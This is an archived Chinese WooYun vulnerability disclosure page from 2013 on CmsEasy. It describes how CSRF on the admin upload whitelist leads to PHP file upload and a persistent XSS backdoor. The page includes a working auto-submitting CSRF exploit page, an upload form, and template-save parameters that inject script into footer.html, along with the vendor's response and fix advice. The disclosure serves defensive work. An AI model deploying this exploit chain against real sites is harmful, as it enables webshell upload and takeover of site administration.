@@ -1,0 +1,357 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		代码审计系列3:cmseasy CSRF导致远程PHP代码执行  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		代码审计系列3:cmseasy CSRF导致远程PHP代码执行  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/LaiX">LaiX</a> 
+</li><li>提交时间：		2013-09-20 13:18</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-20：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-20：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-09-23：	细节向第三方安全合作伙伴开放<br/>
+									2013-09-30：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-10-10：	细节向普通白帽子公开<br/>
+									2013-10-30：	细节向实习白帽子公开<br/>
+									2013-12-19：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">利用后台设计权限可上传PHP文件，并且可利用XSS留永久后门</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1.我们先来看看这个缺陷的地方在哪儿<br />
+<br />
+</p><p class="detail"><a href="../images/191620103614a83403d5473c6d73846bd224c2b0.png" target="_blank"><img src="../images/191620103614a83403d5473c6d73846bd224c2b0.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+cmseasy有一个设置附件后缀白名单的地方，我们可以从这里添加.php后缀来达到上传PHP文件的目的。<br />
+<br />
+<br />
+<br />
+2.如何上传文件<br />
+<br />
+</p><p class="detail"><a href="../images/191624479e7218eeefb9fe74906e04fb6224305f.png" target="_blank"><img src="../images/191624479e7218eeefb9fe74906e04fb6224305f.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+这个页面有上传文件的功能，它会检查白名单中的后缀。<br />
+<br />
+<br />
+<br />
+3.当我们知道如何后台GETSHELL之后，现在我们开始构造利用代码。<br />
+<br />
+CSRF可以帮助我们实现添加文件后缀白名单，于是我们构造出以下代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br />
+&lt;h1&gt;正在跳转...&lt;/h1&gt;<br />
+&lt;iframe id=&quot;test_iframe&quot; style=&#039;display:none&#039;&gt;&lt;/iframe&gt;<br />
+&lt;script&gt;<br />
+function CSRF()<br />
+{<br />
+    test_iframe.document.write(&quot;&lt;form id=&#039;test_form&#039; action=&#039;http://127.0.0.1:8080/CmsEasy/index.php?case=config&amp;act=system&amp;set=upload&amp;admin_dir=admin&amp;site=default&#039; method=&#039;POST&#039; &gt;&quot;<br />
+                                +&quot;&lt;input type=&#039;hidden&#039; name=&#039;upload_filetype&#039; value=&#039;jpg,gif,bmp,jpeg,png,doc,docx,xls,xlsx,zip,rar,7z,txt,sql,pdf,JPG,GIF,BMP,JPEG,PNG,ZIP,RAR,7Z,TXT,SQL,PDF,DOC,DOCX,XLS,XLSX,php,html&#039;&gt;&quot;<br />
+                                +&quot;&lt;input type=&#039;hidden&#039; name=&#039;upload_max_filesize&#039; value=&#039;2&#039;&gt;&quot;<br />
+      	            	        +&quot;&lt;script&gt;document.getElementById(&#039;test_form&#039;).submit();&lt;\/script&gt;&quot;)<br />
+}CSRF();<br />
+window.setTimeout(&quot;window.location.href=&#039;http://threejs.org/&#039;&quot;, 5000)<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+当管理员访问以上代码，就会自动添加PHP后缀。<br />
+<br />
+<br />
+<br />
+4.如何上传PHP文件<br />
+<br />
+经过测试那个文件并没有任何的权限限制，也没有任何的用户限制，它仅仅只判断白名单后缀。<br />
+<br />
+那么我们可以构造如下exploit.html<br />
+<br />
+</p><pre><code>&lt;form method=&quot;post&quot; name=&quot;form1&quot; action=&quot;http://127.0.0.1:8080/CmsEasy/index.php?case=tool&amp;act=uploadfile&quot; enctype=&quot;multipart/form-data&quot; onsubmit=&quot;return checkform();&quot;&gt;<br />
+&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;<br />
+&lt;input type=&quot;file&quot; name=&quot;fileupload&quot; id=&quot;fileupload&quot; style=&quot;width:400px&quot;&gt;<br />
+&lt;br /&gt;<br />
+&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot; 提交 &quot; class=&quot;btn_a&quot;&gt;<br />
+&lt;/form&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+现在我们可以在任何地方使用该exploit 都可以上传PHP文件<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">1.留言板欺骗<br />
+<br />
+</p><p class="detail"><a href="../images/191641231423962341490c8a6c204c90f48b48d9.png" target="_blank"><img src="../images/191641231423962341490c8a6c204c90f48b48d9.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/1916414307b055d23def2acdf615d448b9666d25.png" target="_blank"><img src="../images/1916414307b055d23def2acdf615d448b9666d25.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2.当管理员访问<br />
+<br />
+</p><p class="detail"><a href="../images/1916432108381e8baaca3416d719785f95ff8dcf.png" target="_blank"><img src="../images/1916432108381e8baaca3416d719785f95ff8dcf.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3.上传PHP文件<br />
+<br />
+</p><p class="detail"><a href="../images/191644388df2b60f5ec3b5fb63976d1c6faa8b65.png" target="_blank"><img src="../images/191644388df2b60f5ec3b5fb63976d1c6faa8b65.png" alt="6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4.留XSS永久后门<br />
+<br />
+</p><pre><code>sid:footer_html<br />
+slen:2666<br />
+scontent:&lt;!-- 页底 --&gt;<br />
+&lt;div id=&quot;footer&quot; class=&quot;mt10&quot;&gt;<br />
+&lt;div class=&quot;box&quot;&gt;<br />
+&lt;div class=&quot;footer&quot;&gt;<br />
+&lt;!-- 友情logo --&gt;<br />
+&lt;div class=&quot;links&quot;&gt;<br />
+{if $topid==0}<br />
+{loop friendlink(&#039;image&#039;,0,20) $flink}<br />
+&lt;a href=&quot;{$flink[url]}&quot; title=&quot;{$flink[name]}&quot;&gt;&lt;img src=&quot;{$flink[logo]}&quot; /&gt;&lt;/a&gt;<br />
+{/loop}<br />
+{else}<br />
+{lang(hotkeys)}： {gethotsearch(10)}<br />
+{/if}<br />
+&lt;/div&gt;<br />
+&lt;!-- 页底导航 --&gt;<br />
+&lt;div class=&quot;about&quot;&gt;<br />
+&lt;img src=&quot;{$skin_path}/images/foot_logo.gif&quot; /&gt;<br />
+{tag_网站页底关于我们等说明}<br />
+{if get(&#039;opguestadd&#039;)==&#039;1&#039;}&lt;a rel=&quot;nofollow&quot; href=&quot;{$base_url}/?g=1&quot;&gt;{lang(opguestadd)}&lt;/a&gt; |{/if}<br />
+&lt;a href=&quot;#&quot;&gt;TOP&lt;/a&gt;<br />
+&lt;/div&gt;<br />
+<br />
+&lt;div class=&quot;copyright&quot;&gt;<br />
+<br />
+&lt;!-- 页底说明 --&gt;<br />
+{get(site_right)} &lt;a title=&quot;{get(&#039;sitename&#039;)}&quot; href=&quot;{$base_url}/&quot;&gt;{get(&#039;sitename&#039;)}&lt;/a&gt; All Rights Reserved.   {if get(&#039;site_login&#039;)==&#039;1&#039;}{login_js()}{/if}<br />
+&lt;div class=&quot;blank5&quot;&gt;&lt;/div&gt;<br />
+{getcnzzcount()}  Powered by &lt;a href=&quot;http://www.cmseasy.cn&quot; title=&quot;CmsEasy企业网站系统&quot; target=&quot;_blank&quot;&gt;CmsEasy&lt;/a&gt;  &lt;a rel=&quot;nofollow&quot; href=&quot;http://www.miibeian.gov.cn/&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;{get(&#039;site_icp&#039;)}&lt;/a&gt;<br />
+&lt;/div&gt;<br />
+&lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;<br />
+&lt;/div&gt;<br />
+{if $topid==0}&lt;!-- 热门关键词 --&gt;<br />
+&lt;div class=&quot;hot_keys&quot;&gt;<br />
+&lt;strong&gt;{lang(hotkeys)}：&lt;/strong&gt; {gethotsearch(10)}<br />
+&lt;div class=&quot;blank10&quot;&gt;&lt;/div&gt;<br />
+&lt;!-- 友情链接 --&gt;<br />
+<br />
+&lt;strong&gt;{lang(&#039;links&#039;)}：&lt;/strong&gt;<br />
+{loop friendlink(&#039;text&#039;,0,20) $flink}<br />
+&lt;a href=&quot;{$flink[url]}&quot; target=&quot;_blank&quot;&gt;{$flink[name]}&lt;/a&gt;<br />
+{/loop}<br />
+<br />
+&lt;/div&gt;{/if}<br />
+&lt;/div&gt;<br />
+&lt;/div&gt;<br />
+&lt;script type=&quot;text/javascript&quot; src=&quot;{$base_url}/js/common.js&quot;&gt;&lt;/script&gt;<br />
+<br />
+&lt;script type=&quot;text/javascript&quot;&gt; <br />
+// 公告滚动js<br />
+var t=setInterval(myfunc,1000); <br />
+var oBox=document.getElementById(&quot;announ&quot;); <br />
+function myfunc(){ <br />
+var o=oBox.firstChild <br />
+oBox.removeChild(o) <br />
+oBox.appendChild(o) <br />
+} <br />
+oBox.onmouseover=function()<br />
+{<br />
+clearInterval(t)<br />
+} <br />
+oBox.onmouseout=function()<br />
+{<br />
+t=setInterval(myfunc,2000)//滚动时间，默认2秒<br />
+} <br />
+&lt;/script&gt;<br />
+<br />
+&lt;!-- 在线客服 --&gt;<br />
+{template &#039;system/servers.html&#039;}<br />
+&lt;!-- 短信 --&gt;<br />
+{template &#039;system/sms.html&#039;}<br />
+<br />
+<br />
+{if get(&#039;share&#039;)==&#039;1&#039;}<br />
+&lt;!-- Baidu Button BEGIN --&gt;<br />
+&lt;script type=&quot;text/javascript&quot; id=&quot;bdshare_js&quot; data=&quot;type=slide&amp;img=6&amp;pos=right&amp;uid=620555&quot; &gt;&lt;/script&gt;<br />
+&lt;script type=&quot;text/javascript&quot; id=&quot;bdshell_js&quot;&gt;&lt;/script&gt;<br />
+&lt;script type=&quot;text/javascript&quot;&gt;<br />
+		var bds_config = {&quot;bdTop&quot;:150};<br />
+		document.getElementById(&quot;bdshell_js&quot;).src = &quot;http://bdimg.share.baidu.com/static/js/shell_v2.js?t=&quot; + new Date().getHours();<br />
+&lt;/script&gt;<br />
+&lt;!-- Baidu Button END --&gt;<br />
+{/if}<br />
+<br />
+<br />
+&lt;script&gt;<br />
+function checkmail(str)<br />
+{<br />
+var strreg=&quot;email&quot;;<br />
+var r;<br />
+var strtext=document.all(str).value;<br />
+//strreg=/^w+((-w+)|(.w+))*@[a-za-z0-9]+((.|-)[a-za-z0-9]+)*.[a-za-z0-9]+$/i;<br />
+strreg=/^w+((-w+)|(.w+))*@{1}w+.{1}w{2,4}(.{0,1}w{2}){0,1}/ig;<br />
+r=strtext.search(strreg);<br />
+if(r==-1) {<br />
+alert(&quot;邮箱格式错误!&quot;);<br />
+document.all(str).focus();<br />
+}<br />
+}<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;<br />
+&lt;script&gt;alert()&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+Request URL:http://127.0.0.1:8080/CmsEasy/index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default<br />
+<br />
+将以上参数 作为CSRF 利用，即可在首页(footer.html)留下XSS后门 ， 这里不再演示<br />
+<br />
+</p><p class="detail"><a href="../images/19165242f11cc46164ab19eec073cad13d8a2843.png" target="_blank"><img src="../images/19165242f11cc46164ab19eec073cad13d8a2843.png" alt="7.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">请判断 http://127.0.0.1:8080/CmsEasy/index.php?case=tool&amp;act=uploadfile 使用这个功能上传的时候是否是管理员。<br />
+<br />
+还有限制后台访问来源。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/LaiX" title="LaiX">LaiX</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-037545" title="代码审计系列3:cmseasy CSRF导致远程PHP代码执行">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：8 </p>
+													<p class="detail">确认时间：2013-09-20 15:04</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢，我们将及时处理</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="37545";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
